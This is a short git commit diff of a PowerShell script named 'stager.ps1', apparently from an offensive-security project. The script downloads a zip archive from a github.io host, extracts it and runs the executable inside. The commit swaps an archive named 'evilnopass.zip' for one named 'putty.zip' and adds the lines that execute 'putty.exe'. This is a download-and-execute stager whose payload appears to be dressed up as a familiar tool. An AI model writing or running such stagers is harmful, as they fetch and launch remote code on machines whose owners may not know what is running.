1863db25d28817d8ee05ca52970b264db033c618
SimonSchoeni <62761108+SimonSchoeni@users.noreply.github.com>
2023-10-23 15:02:55 +0200

    Update stager.ps1

--- stager.ps1
+++ stager.ps1
@@ -1,2 +1,4 @@
-Invoke-WebRequest "https://simonschoeni.github.io/evilnopass.zip" -OutFile "download.zip"; 
+Invoke-WebRequest "https://simonschoeni.github.io/putty.zip" -OutFile "download.zip"; 
 Expand-Archive "download.zip"
+Set-Location "download"
+.\putty.exe
